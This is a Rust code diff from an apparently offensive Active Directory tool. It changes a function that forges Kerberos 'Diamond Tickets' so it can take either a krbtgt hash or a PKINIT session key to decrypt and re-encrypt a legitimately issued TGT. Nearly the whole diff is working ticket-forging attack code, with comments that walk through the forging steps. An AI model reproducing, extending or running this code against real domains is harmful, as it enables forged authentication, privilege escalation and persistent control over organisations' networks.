@@ -28,19 +28,42 @@ use crate::validate;
 pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
     info!("[diamond] Forging Diamond Ticket for {}", config.domain);
 
-    let krbtgt_hash = config
-        .krbtgt_hash
-        .as_deref()
-        .or(config.krbtgt_aes256.as_deref())
-        .ok_or_else(|| {
-            OverthroneError::TicketForge("krbtgt hash is required for Diamond Ticket".into())
-        })?;
-
     let domain_sid = config.domain_sid.as_deref().ok_or_else(|| {
         OverthroneError::TicketForge("Domain SID is required for Diamond Ticket".into())
     })?;
-
     validate::validate_sid_format(domain_sid)?;
+
+    let (krbtgt_key, krbtgt_etype) = if let Some((ref session_key, session_etype)) =
+        config.pkinit_session_key
+    {
+        info!(
+            "[diamond] Using PKINIT session key for decrypt/encrypt (etype={}, {} bytes)",
+            session_etype,
+            session_key.len()
+        );
+        (session_key.clone(), session_etype)
+    } else {
+        let krbtgt_hash = config
+            .krbtgt_hash
+            .as_deref()
+            .or(config.krbtgt_aes256.as_deref())
+            .ok_or_else(|| {
+                OverthroneError::TicketForge("krbtgt hash is required for Diamond Ticket".into())
+            })?;
+        let key = hex::decode(krbtgt_hash.trim())
+            .map_err(|e| OverthroneError::TicketForge(format!("Invalid krbtgt hash: {e}")))?;
+        let etype = match key.len() {
+            16 => ETYPE_RC4_HMAC,
+            32 => ETYPE_AES256_CTS,
+            _ => {
+                return Err(OverthroneError::TicketForge(format!(
+                    "krbtgt key must be 16 or 32 bytes, got {}",
+                    key.len()
+                )));
+            }
+        };
+        (key, etype)
+    };
 
     // Step 1: Request a legitimate TGT from the KDC
     info!("[diamond] Step 1: Requesting TGT as {}", config.username);
@@ -51,22 +74,8 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
         legit_tgt.session_key_etype
     );
 
-    // Step 2: Decrypt the ticket's enc-part using krbtgt key
-    info!("[diamond] Step 2: Decrypting ticket with krbtgt key");
-    let krbtgt_key = hex::decode(krbtgt_hash.trim())
-        .map_err(|e| OverthroneError::TicketForge(format!("Invalid krbtgt hash: {e}")))?;
-
-    let krbtgt_etype = match krbtgt_key.len() {
-        16 => ETYPE_RC4_HMAC,
-        32 => ETYPE_AES256_CTS,
-        _ => {
-            return Err(OverthroneError::TicketForge(format!(
-                "krbtgt key must be 16 or 32 bytes, got {}",
-                krbtgt_key.len()
-            )));
-        }
-    };
-
+    // Step 2: Decrypt the ticket's enc-part using krbtgt key (or PKINIT session key)
+    info!("[diamond] Step 2: Decrypting ticket with forging key");
     let cipher = new_kerberos_cipher(krbtgt_etype)
         .map_err(|e| OverthroneError::TicketForge(format!("Cipher: {e}")))?;
 
